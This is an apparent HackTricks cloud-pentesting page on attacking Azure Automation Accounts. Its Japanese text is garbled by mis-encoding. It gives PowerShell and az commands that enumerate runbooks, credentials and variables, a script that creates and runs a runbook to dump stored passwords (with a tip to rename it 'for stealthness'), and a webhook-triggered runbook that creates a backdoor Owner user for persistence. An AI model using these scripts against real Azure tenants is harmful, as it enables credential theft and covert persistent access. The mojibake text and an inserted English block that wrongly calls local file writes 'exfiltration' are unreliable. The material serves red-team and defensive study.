# Az - Automation Account

<details>

<summary><strong>ãƒãƒƒã‚¯ãƒˆãƒªãƒƒã‚¯ã‚’ã‚µãƒãƒ¼ãƒˆã—ã¦ç‰¹å…¸ã‚’å¾—ã‚‹ï¼</strong></summary>

* **HackTricksã§ä¼šç¤¾ã®åºƒå‘Šã‚’è¦‹ãŸã„**å ´åˆã‚„ã€**æœ€æ–°ãƒãƒ¼ã‚¸ãƒ§ãƒ³ã®PEASSã‚’å…¥æ‰‹ã—ãŸã‚Šã€HackTricksã‚’PDFã§ãƒ€ã‚¦ãƒ³ãƒ­ãƒ¼ãƒ‰**ã—ãŸã„å ´åˆã¯ã€[**SUBSCRIPTION PLANS**](https://github.com/sponsors/carlospolop)ã‚’ãƒã‚§ãƒƒã‚¯ã—ã¦ãã ã•ã„ï¼
* [**å…¬å¼PEASSï¼†HackTricksã‚°ãƒƒã‚º**](https://peass.creator-spring.com)ã‚’æ‰‹ã«å…¥ã‚Œã‚‹
* [**The PEASS Family**](https://opensea.io/collection/the-peass-family)ã‚’è¦‹ã¤ã‘ã¦ã€ç‹¬å çš„ãª[**NFT**](https://opensea.io/collection/the-peass-family)ã®ã‚³ãƒ¬ã‚¯ã‚·ãƒ§ãƒ³ã‚’è¦‹ã¤ã‘ã‚‹
* ğŸ’¬ [**Discordã‚°ãƒ«ãƒ¼ãƒ—**](https://discord.gg/hRep4RUj7f)ã¾ãŸã¯[**telegramã‚°ãƒ«ãƒ¼ãƒ—**](https://t.me/peass)ã«å‚åŠ ã™ã‚‹ã‹ã€**Twitter**ã§**ãƒ•ã‚©ãƒ­ãƒ¼**ã™ã‚‹ ğŸ¦ [**@carlospolopm**](https://twitter.com/carlospolopm)
* **ãƒãƒƒã‚­ãƒ³ã‚°ã®ãƒˆãƒªãƒƒã‚¯ã‚’å…±æœ‰ã™ã‚‹ãŸã‚ã«ã€PRã‚’æå‡ºã—ã¦** [**HackTricks**](https://github.com/carlospolop/hacktricks)ã¨[**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud)ã®GitHubãƒªãƒã‚¸ãƒˆãƒªã«å‚åŠ ã™ã‚‹

</details>

## åŸºæœ¬æƒ…å ±

Azure Automationã¯ã€ã‚¯ãƒ©ã‚¦ãƒ‰ãƒ™ãƒ¼ã‚¹ã®è‡ªå‹•åŒ–ã€ã‚ªãƒšãƒ¬ãƒ¼ãƒ†ã‚£ãƒ³ã‚°ã‚·ã‚¹ãƒ†ãƒ ã®æ›´æ–°ã€ãŠã‚ˆã³æ§‹æˆã‚µãƒ¼ãƒ“ã‚¹ã‚’æä¾›ã—ã€Azureç’°å¢ƒã¨éAzureç’°å¢ƒã®ä¸€è²«ã—ãŸç®¡ç†ã‚’ã‚µãƒãƒ¼ãƒˆã—ã¾ã™ã€‚ãƒ—ãƒ­ã‚»ã‚¹ã®è‡ªå‹•åŒ–ã€æ§‹æˆç®¡ç†ã€æ›´æ–°ç®¡ç†ã€å…±æœ‰æ©Ÿèƒ½ã€ãŠã‚ˆã³ç•°ç¨®ç’°å¢ƒã®æ©Ÿèƒ½ãŒå«ã¾ã‚Œã¦ã„ã¾ã™ã€‚

ã“ã‚Œã‚‰ã¯Azureã®ã€Œ**ã‚¹ã‚±ã‚¸ãƒ¥ãƒ¼ãƒ«ã•ã‚ŒãŸã‚¿ã‚¹ã‚¯**ã€ã®ã‚ˆã†ãªã‚‚ã®ã§ã€Azureç’°å¢ƒã®**ç®¡ç†**ã€ãƒã‚§ãƒƒã‚¯ã€ãŠã‚ˆã³æ§‹æˆã‚’å®Ÿè¡Œã™ã‚‹ãŸã‚ã®ã‚‚ã®ã§ã™ã€‚

### Run As ã‚¢ã‚«ã‚¦ãƒ³ãƒˆ

**Run as ã‚¢ã‚«ã‚¦ãƒ³ãƒˆ**ã‚’ä½¿ç”¨ã™ã‚‹ã¨ã€Azure ADã«**è‡ªå·±ç½²åè¨¼æ˜æ›¸ã‚’æŒã¤ã‚¢ãƒ—ãƒªã‚±ãƒ¼ã‚·ãƒ§ãƒ³**ãŒä½œæˆã•ã‚Œã€**ã‚µãƒ¼ãƒ“ã‚¹ãƒ—ãƒªãƒ³ã‚·ãƒ‘ãƒ«**ãŒä½œæˆã•ã‚Œã€**Contributor**ãƒ­ãƒ¼ãƒ«ãŒ**ç¾åœ¨ã®ã‚µãƒ–ã‚¹ã‚¯ãƒªãƒ—ã‚·ãƒ§ãƒ³**ã®ã‚¢ã‚«ã‚¦ãƒ³ãƒˆã«å‰²ã‚Šå½“ã¦ã‚‰ã‚Œã¾ã™ï¼ˆå¤šãã®ç‰¹æ¨©ãŒã‚ã‚Šã¾ã™ï¼‰ã€‚\
Microsoftã¯Automation Accountã«ã¯**Managed Identity**ã‚’ä½¿ç”¨ã™ã‚‹ã“ã¨ã‚’æ¨å¥¨ã—ã¦ã„ã¾ã™ã€‚

{% hint style="warning" %}
ã“ã‚Œã¯**2023å¹´9æœˆ30æ—¥ã«å‰Šé™¤ã•ã‚Œã€Managed Identityã«å¤‰æ›´ã•ã‚Œã¾ã™**ã€‚
{% endhint %}

## Runbooks & Jobsã®ä¾µå®³

**Runbooks**ã‚’ä½¿ç”¨ã™ã‚‹ã¨ã€**ä»»æ„ã®PowerShell**ã‚³ãƒ¼ãƒ‰ã‚’å®Ÿè¡Œã§ãã¾ã™ã€‚ã“ã‚Œã¯ã€æ”»æ’ƒè€…ãŒ**é–¢é€£ã™ã‚‹ãƒ—ãƒªãƒ³ã‚·ãƒ‘ãƒ«**ã®æ¨©é™ã‚’ç›—ã‚€ãŸã‚ã«æ‚ªç”¨ã•ã‚Œã‚‹å¯èƒ½æ€§ãŒã‚ã‚Šã¾ã™ã€‚\
**Runbooks**ã®**ã‚³ãƒ¼ãƒ‰**ã«ã¯ã€ã‚¯ãƒ¬ãƒ‡ãƒ³ã‚·ãƒ£ãƒ«ãªã©ã®**æ©Ÿå¯†æƒ…å ±**ã‚‚å«ã¾ã‚Œã¦ã„ã‚‹å ´åˆãŒã‚ã‚Šã¾ã™ã€‚

**ã‚¸ãƒ§ãƒ–**ã‚’**èª­ã‚€**ã“ã¨ãŒã§ãã‚‹å ´åˆã¯ã€å®Ÿè¡Œã®**å‡ºåŠ›**ï¼ˆæ½œåœ¨çš„ãª**æ©Ÿå¯†æƒ…å ±**ï¼‰ã‚’å«ã‚“ã§ã„ã‚‹ã®ã§ã€ç¢ºèªã—ã¦ãã ã•ã„ã€‚

`Automation Accounts`ã«ç§»å‹• --> `<é¸æŠã—ãŸAutomation Account>` --> `Runbooks/Jobs/Hybrid worker groups/Watcher tasks/credentials/variables/certificates/connections`

### Hybrid Worker

Runbookã¯ã€Azureå†…ã®**ã‚³ãƒ³ãƒ†ãƒŠ**ã¾ãŸã¯**Hybrid Worker**ã§å®Ÿè¡Œã§ãã¾ã™ã€‚\
**Log Analytics Agent**ãŒVMã«å±•é–‹ã•ã‚Œã€ãƒã‚¤ãƒ–ãƒªãƒƒãƒ‰ãƒ¯ãƒ¼ã‚«ãƒ¼ã¨ã—ã¦ç™»éŒ²ã•ã‚Œã¾ã™ã€‚\
ãƒã‚¤ãƒ–ãƒªãƒƒãƒ‰ãƒ¯ãƒ¼ã‚«ãƒ¼ã‚¸ãƒ§ãƒ–ã¯ã€Windowsã§ã¯**SYSTEM**ã§ã€Linuxã§ã¯**nxautomation**ã‚¢ã‚«ã‚¦ãƒ³ãƒˆã§å®Ÿè¡Œã•ã‚Œã¾ã™ã€‚\
å„ãƒã‚¤ãƒ–ãƒªãƒƒãƒ‰ãƒ¯ãƒ¼ã‚«ãƒ¼ã¯ã€**ãƒã‚¤ãƒ–ãƒªãƒƒãƒ‰ãƒ¯ãƒ¼ã‚«ãƒ¼ã‚°ãƒ«ãƒ¼ãƒ—**ã«ç™»éŒ²ã•ã‚Œã¾ã™ã€‚

ã—ãŸãŒã£ã¦ã€**Windows Hybrid Worker**ã§**Runbook**ã‚’å®Ÿè¡Œã™ã‚‹ã“ã¨ã‚’é¸æŠã§ãã‚‹å ´åˆã€ãã®ãƒã‚·ãƒ³å†…ã§**ã‚·ã‚¹ãƒ†ãƒ **ã¨ã—ã¦**ä»»æ„ã®ã‚³ãƒãƒ³ãƒ‰**ã‚’å®Ÿè¡Œã§ãã¾ã™ã€‚

## State Configuration (SC)ã®ä¾µå®³

Azure Automationã®**State Configuration**ã¯ã€Azureã®æ§‹æˆç®¡ç†ã‚µãƒ¼ãƒ“ã‚¹ã§ã‚ã‚Šã€ã‚¯ãƒ©ã‚¦ãƒ‰ã¾ãŸã¯ã‚ªãƒ³ãƒ—ãƒ¬ãƒŸã‚¹ã®ãƒ‡ãƒ¼ã‚¿ã‚»ãƒ³ã‚¿ãƒ¼ã®ãƒãƒ¼ãƒ‰ã«å¯¾ã—ã¦PowerShell Desired State Configuration (DSC) [configurations](https://learn.microsoft.com/en-us/powershell/dsc/configurations/configurations)ã‚’è¨˜è¿°ã€ç®¡ç†ã€ãŠã‚ˆã³ã‚³ãƒ³ãƒ‘ã‚¤ãƒ«ã™ã‚‹ã“ã¨ãŒã§ãã¾ã™ã€‚ã“ã®ã‚µãƒ¼ãƒ“ã‚¹ã§ã¯[DSC Resources](https://learn.microsoft.com/en-us/powershell/dsc/resources/resources)ã‚’ã‚¤ãƒ³ãƒãƒ¼ãƒˆã—ã€æ§‹æˆã‚’å¯¾è±¡ãƒãƒ¼ãƒ‰ã«å‰²ã‚Šå½“ã¦ã‚‹ã“ã¨ã‚‚ã§ãã¾ã™ã€‚Azureãƒãƒ¼ã‚¿ãƒ«ã§Azure Automation State Configurationã«ã‚¢ã‚¯ã‚»ã‚¹ã™ã‚‹ã«ã¯ã€**Configuration Management**ã®ä¸‹ã«ã‚ã‚‹**State configuration (DSC)**ã‚’é¸æŠã—ã¾ã™ã€‚

ã“ã‚Œã‚‰ã®æ§‹æˆã«ã¯**æ©Ÿå¯†æƒ…å ±**ãŒå«ã¾ã‚Œã¦ã„ã‚‹å ´åˆãŒã‚ã‚Šã¾ã™ã€‚

### RCE

SCã‚’æ‚ªç”¨ã—ã¦ã€ç®¡ç†ã•ã‚ŒãŸãƒã‚·ãƒ³ã§ä»»æ„ã®ã‚¹ã‚¯ãƒªãƒ—ãƒˆã‚’å®Ÿè¡Œã™ã‚‹ã“ã¨ãŒå¯èƒ½ã§ã™ã€‚

{% content-ref url="az-state-configuration-rce.md" %}
[az-state-configuration-rce.md](az-state-configuration-rce.md)
{% endcontent-ref %}

## åˆ—æŒ™

{% code overflow="wrap" %}
```powershell
# Check user right for automation
az extension add --upgrade -n automation
az automation account list # if it doesn't return anything the user is not a part of an Automation group

# Gets Azure Automation accounts in a resource group
Get-AzAutomationAccount

# List & get DSC configs
Get-AzAutomationAccount | Get-AzAutomationDscConfiguration
Get-AzAutomationAccount | Get-AzAutomationDscConfiguration | where {$_.name -match '<name>'} | Export-AzAutomationDscConfiguration -OutputFolder . -Debug
## Automation Accounts named SecurityBaselineConfigurationWS... are there by default (not interesting)

# List & get Run books code
Get-AzAutomationAccount | Get-AzAutomationRunbook
Get-AzAutomationAccount | Get-AzAutomationRunbook | Export-AzAutomationRunbook -OutputFolder /tmp

# List credentials & variables & others
Get-AzAutomationAccount | Get-AzAutomationCredential
Get-AzAutomationAccount | Get-AzAutomationVariable
Get-AzAutomationAccount | Get-AzAutomationConnection
Get-AzAutomationAccount | Get-AzAutomationCertificate
Get-AzAutomationAccount | Get-AzAutomationSchedule
Get-AzAutomationAccount | Get-AzAutomationModule
Get-AzAutomationAccount | Get-AzAutomationPython3Package
## Exfiltrate credentials & variables and the other info loading them in a Runbook and printing them

# List hybrid workers
Get-AzAutomationHybridWorkerGroup -AutomationAccountName <AUTOMATION-ACCOUNT> -ResourceGroupName <RG-NAME>
```
### ãƒ©ãƒ³ãƒ–ãƒƒã‚¯ã®ä½œæˆ

{% code overflow="wrap" %}
```powershell
# Get the role of a user on the Automation account
# Contributor or higher = Can create and execute Runbooks
Get-AzRoleAssignment -Scope /subscriptions/<ID>/resourceGroups/<RG-NAME>/providers/Microsoft.Automation/automationAccounts/<AUTOMATION-ACCOUNT>

# Create a Powershell Runbook
Import-AzAutomationRunbook -Name <RUNBOOK-NAME> -Path C:\Tools\username.ps1 -AutomationAccountName <AUTOMATION-ACCOUNT> -ResourceGroupName <RG-NAME> -Type PowerShell -Force -Verbose

# Publish the Runbook
Publish-AzAutomationRunbook -RunbookName <RUNBOOK-NAME> -AutomationAccountName <AUTOMATION-ACCOUNT> -ResourceGroupName <RG-NAME> -Verbose

# Start the Runbook
Start-AzAutomationRunbook -RunbookName <RUNBOOK-NAME> -RunOn Workergroup1 -AutomationAccountName <AUTOMATION-ACCOUNT> -ResourceGroupName <RG-NAME> -Verbose
```
{% endcode %}

### ãƒ©ãƒ³ãƒ–ãƒƒã‚¯ã‚’ä½¿ç”¨ã—ã¦ã€Automation Accountã§å®šç¾©ã•ã‚ŒãŸè³‡æ ¼æƒ…å ±ã¨å¤‰æ•°ã‚’å¤–éƒ¨ã«æŒã¡å‡ºã™

In this technique, we will use a run book in Azure Automation to exfiltrate credentials and variables defined in an Automation Account. This can be useful during a penetration test to gather sensitive information.

ã“ã®ãƒ†ã‚¯ãƒ‹ãƒƒã‚¯ã§ã¯ã€Azure Automationã®ãƒ©ãƒ³ãƒ–ãƒƒã‚¯ã‚’ä½¿ç”¨ã—ã¦ã€Automation Accountã§å®šç¾©ã•ã‚ŒãŸè³‡æ ¼æƒ…å ±ã¨å¤‰æ•°ã‚’å¤–éƒ¨ã«æŒã¡å‡ºã—ã¾ã™ã€‚ã“ã‚Œã¯ã€ãƒšãƒãƒˆãƒ¬ãƒ¼ã‚·ãƒ§ãƒ³ãƒ†ã‚¹ãƒˆä¸­ã«æ©Ÿå¯†æƒ…å ±ã‚’åé›†ã™ã‚‹ãŸã‚ã«å½¹ç«‹ã¡ã¾ã™ã€‚

First, we need to create a run book in the Azure portal. Go to the Automation Account and navigate to the "Runbooks" section. Click on "Create a runbook" and provide a name and description for the run book.

ã¾ãšã€Azureãƒãƒ¼ã‚¿ãƒ«ã§ãƒ©ãƒ³ãƒ–ãƒƒã‚¯ã‚’ä½œæˆã™ã‚‹å¿…è¦ãŒã‚ã‚Šã¾ã™ã€‚Automation Accountã«ç§»å‹•ã—ã€ã€Œãƒ©ãƒ³ãƒ–ãƒƒã‚¯ã€ã‚»ã‚¯ã‚·ãƒ§ãƒ³ã«ç§»å‹•ã—ã¾ã™ã€‚[ãƒ©ãƒ³ãƒ–ãƒƒã‚¯ã®ä½œæˆ]ã‚’ã‚¯ãƒªãƒƒã‚¯ã—ã€ãƒ©ãƒ³ãƒ–ãƒƒã‚¯ã®åå‰ã¨èª¬æ˜ã‚’å…¥åŠ›ã—ã¾ã™ã€‚

Next, we need to add the necessary code to the run book to exfiltrate the credentials and variables. The following PowerShell code can be used:

æ¬¡ã«ã€ãƒ©ãƒ³ãƒ–ãƒƒã‚¯ã«å¿…è¦ãªã‚³ãƒ¼ãƒ‰ã‚’è¿½åŠ ã—ã¦ã€è³‡æ ¼æƒ…å ±ã¨å¤‰æ•°ã‚’å¤–éƒ¨ã«æŒã¡å‡ºã—ã¾ã™ã€‚æ¬¡ã®PowerShellã‚³ãƒ¼ãƒ‰ã‚’ä½¿ç”¨ã§ãã¾ã™ã€‚

```powershell
$connectionName = "AzureRunAsConnection"
$servicePrincipalConnection = Get-AutomationConnection -Name $connectionName

Connect-AzAccount -ServicePrincipal `
    -TenantId $servicePrincipalConnection.TenantId `
    -ApplicationId $servicePrincipalConnection.ApplicationId `
    -CertificateThumbprint $servicePrincipalConnection.CertificateThumbprint

# Exfiltrate credentials
$credentials = Get-AutomationPSCredential -Name "CredentialName"
$credentials.GetNetworkCredential().Password | Out-File -FilePath "C:\temp\credentials.txt"

# Exfiltrate variables
$variables = Get-AutomationVariable
$variables | Out-File -FilePath "C:\temp\variables.txt"
```

Replace "CredentialName" with the name of the credential you want to exfiltrate. The credentials will be saved in a file called "credentials.txt" in the specified file path.

"CredentialName"ã‚’å¤–éƒ¨ã«æŒã¡å‡ºã—ãŸã„è³‡æ ¼æƒ…å ±ã®åå‰ã«ç½®ãæ›ãˆã¾ã™ã€‚è³‡æ ¼æƒ…å ±ã¯ã€æŒ‡å®šã—ãŸãƒ•ã‚¡ã‚¤ãƒ«ãƒ‘ã‚¹ã«ã€Œcredentials.txtã€ã¨ã„ã†åå‰ã®ãƒ•ã‚¡ã‚¤ãƒ«ã«ä¿å­˜ã•ã‚Œã¾ã™ã€‚

The variables will be saved in a file called "variables.txt" in the specified file path.

å¤‰æ•°ã¯ã€æŒ‡å®šã—ãŸãƒ•ã‚¡ã‚¤ãƒ«ãƒ‘ã‚¹ã«ã€Œvariables.txtã€ã¨ã„ã†åå‰ã®ãƒ•ã‚¡ã‚¤ãƒ«ã«ä¿å­˜ã•ã‚Œã¾ã™ã€‚

Once the code is added, save the run book and publish it.

ã‚³ãƒ¼ãƒ‰ã‚’è¿½åŠ ã—ãŸã‚‰ã€ãƒ©ãƒ³ãƒ–ãƒƒã‚¯ã‚’ä¿å­˜ã—ã¦å…¬é–‹ã—ã¾ã™ã€‚

To execute the run book and exfiltrate the credentials and variables, go to the "Runbooks" section in the Automation Account and click on the run book. Click on "Start" and follow the prompts to execute the run book.

ãƒ©ãƒ³ãƒ–ãƒƒã‚¯ã‚’å®Ÿè¡Œã—ã¦è³‡æ ¼æƒ…å ±ã¨å¤‰æ•°ã‚’å¤–éƒ¨ã«æŒã¡å‡ºã™ã«ã¯ã€Automation Accountã®ã€Œãƒ©ãƒ³ãƒ–ãƒƒã‚¯ã€ã‚»ã‚¯ã‚·ãƒ§ãƒ³ã«ç§»å‹•ã—ã€ãƒ©ãƒ³ãƒ–ãƒƒã‚¯ã‚’ã‚¯ãƒªãƒƒã‚¯ã—ã¾ã™ã€‚[é–‹å§‹]ã‚’ã‚¯ãƒªãƒƒã‚¯ã—ã€æŒ‡ç¤ºã«å¾“ã£ã¦ãƒ©ãƒ³ãƒ–ãƒƒã‚¯ã‚’å®Ÿè¡Œã—ã¾ã™ã€‚

After the run book has finished executing, you can retrieve the exfiltrated credentials and variables from the specified file path.

ãƒ©ãƒ³ãƒ–ãƒƒã‚¯ã®å®Ÿè¡ŒãŒçµ‚äº†ã—ãŸã‚‰ã€æŒ‡å®šã—ãŸãƒ•ã‚¡ã‚¤ãƒ«ãƒ‘ã‚¹ã‹ã‚‰å¤–éƒ¨ã«æŒã¡å‡ºã•ã‚ŒãŸè³‡æ ¼æƒ…å ±ã¨å¤‰æ•°ã‚’å–å¾—ã§ãã¾ã™ã€‚
```powershell
# Change the crdentials & variables names and add as many as you need
@'
$creds = Get-AutomationPSCredential -Name <credentials_name>
$runbook_variable = Get-AutomationVariable -name <variable_name>
$runbook_variable
$creds.GetNetworkCredential().username
$creds.GetNetworkCredential().password
'@ | out-file -encoding ascii 'runbook_get_creds.ps1'

$ResourceGroupName = '<resource_group_name>'
$AutomationAccountName = '<auto_acc_name>'
$RunBookName = 'Exif-Credentials' #Change this for stealthness

# Creare Run book, publish, start, and get output
New-AzAutomationRunBook -name $RunBookName -AutomationAccountName $AutomationAccountName -ResourceGroupName $ResourceGroupName -Type PowerShell
Import-AzAutomationRunBook -Path 'runbook_get_creds.ps1' -Name $RunBookName -Type PowerShell -AutomationAccountName $AutomationAccountName -ResourceGroupName $ResourceGroupName -Force
Publish-AzAutomationRunBook -Name $RunBookName -AutomationAccountName $AutomationAccountName -ResourceGroupName $ResourceGroupName
$start = Start-AzAutomationRunBook -Name $RunBookName -AutomationAccountName $AutomationAccountName -ResourceGroupName $ResourceGroupName
start-sleep 20
($start | Get-AzAutomationJob | Get-AzAutomationJobOutput).Summarynt
```
{% hint style="info" %}
åŒã˜ã“ã¨ã‚’ã€æ—¢å­˜ã®ãƒ©ãƒ³ãƒ–ãƒƒã‚¯ã‚’å¤‰æ›´ã—ã¦ã€ã‚¦ã‚§ãƒ–ã‚³ãƒ³ã‚½ãƒ¼ãƒ«ã‹ã‚‰ã‚‚è¡Œã†ã“ã¨ãŒã§ãã¾ã™ã€‚
{% endhint %}

## æŒç¶šæ€§

### é«˜ç‰¹æ¨©ãƒ¦ãƒ¼ã‚¶ãƒ¼ã‚’ä½œæˆã™ã‚‹è‡ªå‹•åŒ–

* æ–°ã—ã„è‡ªå‹•åŒ–ã‚¢ã‚«ã‚¦ãƒ³ãƒˆã‚’ä½œæˆã—ã¾ã™ã€‚
* "Azure Run As ã‚¢ã‚«ã‚¦ãƒ³ãƒˆã‚’ä½œæˆã™ã‚‹": Yes
* AzureADãƒ¦ãƒ¼ã‚¶ãƒ¼ã‚’Owneræ¨©é™ã§ä½œæˆã™ã‚‹æ–°ã—ã„ãƒ©ãƒ³ãƒ–ãƒƒã‚¯ã‚’ã‚¤ãƒ³ãƒãƒ¼ãƒˆã—ã¾ã™ã€‚
* ã“ã®ãƒ–ãƒ­ã‚°ã®ã‚µãƒ³ãƒ—ãƒ«ãƒ©ãƒ³ãƒ–ãƒƒã‚¯ã¯ã“ã¡ã‚‰ã«ã‚ã‚Šã¾ã™ - [https://github.com/NetSPI/MicroBurst](https://github.com/NetSPI/MicroBurst)
* ãƒ©ãƒ³ãƒ–ãƒƒã‚¯ã‚’å…¬é–‹ã—ã¾ã™ã€‚
* ãƒ©ãƒ³ãƒ–ãƒƒã‚¯ã«Webhookã‚’è¿½åŠ ã—ã¾ã™ã€‚
* AzureADãƒ¢ã‚¸ãƒ¥ãƒ¼ãƒ«ã‚’è‡ªå‹•åŒ–ã‚¢ã‚«ã‚¦ãƒ³ãƒˆã«è¿½åŠ ã—ã¾ã™ã€‚
* Azure Automationãƒ¢ã‚¸ãƒ¥ãƒ¼ãƒ«ã‚’æ›´æ–°ã—ã¾ã™ã€‚
* "ãƒ¦ãƒ¼ã‚¶ãƒ¼ç®¡ç†è€…"ã¨"ã‚µãƒ–ã‚¹ã‚¯ãƒªãƒ—ã‚·ãƒ§ãƒ³ã‚ªãƒ¼ãƒŠãƒ¼"ã®æ¨©é™ã‚’è‡ªå‹•åŒ–ã‚¢ã‚«ã‚¦ãƒ³ãƒˆã«å‰²ã‚Šå½“ã¦ã¾ã™ã€‚
* æœ€çµ‚çš„ã«ã‚¢ã‚¯ã‚»ã‚¹ã‚’å¤±ã„ã¾ã™...
*   æ–°ã—ã„ãƒ¦ãƒ¼ã‚¶ãƒ¼ã‚’ä½œæˆã™ã‚‹ãŸã‚ã«ã€ãƒã‚¹ãƒˆãƒªã‚¯ã‚¨ã‚¹ãƒˆã§Webhookã‚’ãƒˆãƒªã‚¬ãƒ¼ã—ã¾ã™ã€‚

```powershell
$uri = "https://s15events.azure-automation.net/webhooks?token=h6[REDACTED]%3d"
$AccountInfo  = @(@{RequestBody=@{Username="BackdoorUsername";Password="BackdoorPassword"}})
$body = ConvertTo-Json -InputObject $AccountInfo
$response = Invoke-WebRequest -Method Post -Uri $uri -Body $body
```

## å‚è€ƒæ–‡çŒ®

* [https://learn.microsoft.com/en-us/azure/automation/overview](https://learn.microsoft.com/en-us/azure/automation/overview)
* [https://learn.microsoft.com/en-us/azure/automation/automation-dsc-overview](https://learn.microsoft.com/en-us/azure/automation/automation-dsc-overview)
* [https://github.com/rootsecdev/Azure-Red-Team#runbook-automation](https://github.com/rootsecdev/Azure-Red-Team#runbook-automation)

<details>

<summary><strong>Support HackTricks and get benefits!</strong></summary>

* If you want to see your **company advertised in HackTricks** or if you want access to the **latest version of the PEASS or download HackTricks in PDF** Check the [**SUBSCRIPTION PLANS**](https://github.com/sponsors/carlospolop)!
* Get the [**official PEASS & HackTricks swag**](https://peass.creator-spring.com)
* Discover [**The PEASS Family**](https://opensea.io/collection/the-peass-family), our collection of exclusive [**NFTs**](https://opensea.io/collection/the-peass-family)
* **Join the** ğŸ’¬ [**Discord group**](https://discord.gg/hRep4RUj7f) or the [**telegram group**](https://t.me/peass) or **follow** me on **Twitter** ğŸ¦ [**@carlospolopm**](https://twitter.com/carlospolopm)**.**
* **Share your hacking tricks by submitting PRs to the** [**HackTricks**](https://github.com/carlospolop/hacktricks) and [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.

</details>
